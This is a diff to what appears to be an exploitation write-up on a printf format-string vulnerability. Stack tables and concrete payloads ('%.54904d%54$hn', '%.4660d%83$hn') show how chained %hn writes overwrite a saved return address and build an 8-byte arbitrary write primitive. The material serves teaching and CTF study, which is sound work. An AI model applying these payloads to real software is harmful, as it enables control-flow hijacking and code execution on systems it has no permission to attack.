@@ -83,7 +83,59 @@ d3 = b'd%83$hn'
 padlen = max(0, 16 - (len(d1) + len(d2) + len(d3)))
 ```
 
-2 bytes offset is ok, since those arguments are close to each other (the 54th and 83rd).
+to demostrate this gibberish i just wrote with a somewhat graphical representation:
+
+```
++----------------------+------------------+--------------------+--------------+
+|      Address         |      Value       |      Comment       | Printf arg № |
++----------------------+------------------+--------------------+--------------+
+|     7FFFFFFFD520     | 0000000000000000 |        RSP         |       6      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD678     |   7FFFF7DD5A90   |    return addr     |      49      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD6A0     |   7FFFFFFFD788   |magical ptr to buffr|      54      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD778     |   7FFFFFFFDA1F   |    write buffer    |      83      |
++----------------------+------------------+--------------------+--------------+
+```
+
+suppose we want to write to return addr 2 lowest bytes
+
+with payload %.54904d%54$hn-- (where 54904 is 0xD678 -> last 2 bytes of the return addres)
+```
++----------------------+------------------+--------------------+--------------+
+|      Address         |      Value       |      Comment       | Printf arg № |
++----------------------+------------------+--------------------+--------------+
+|     7FFFFFFFD520     | 0000000000000000 |        RSP         |       6      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD678     |   7FFFF7DD5A90   |    return addr     |      49      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD6A0     |   7FFFFFFFD788   |magical ptr to buffr|      54      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD778     |  7FFFFFFF*D678*  |    write buffer    |      83      |
++----------------------+------------------+--------------------+--------------+
+```
+now we can read from that address and write to the one we want - 7FFFFFFFD678
+
+suppose we want to write bytes 0x1234
+
+with payload %.4660d%83$hn--- (4660 is 0x1234)
+
+```
++----------------------+------------------+--------------------+--------------+
+|      Address         |      Value       |      Comment       | Printf arg № |
++----------------------+------------------+--------------------+--------------+
+|     7FFFFFFFD520     | 0000000000000000 |        RSP         |       6      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD678     |  7FFFF7DD*1234*  |    return addr     |      49      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD6A0     |   7FFFFFFFD788   |magical ptr to buffr|      54      |
+|         ...          |       ...        |        ...         |      ...     |
+|     7FFFFFFFD778     |   7FFFFFFFD678   |    write buffer    |      83      |
++----------------------+------------------+--------------------+--------------+
+```
+
+2 bytes offset is working ok, since those arguments are close to each other (the 54th and 83rd).
 
 So from that we can actually make an 8 byte write primitive
 just repeating that 4 times and adjusting the values a bit:
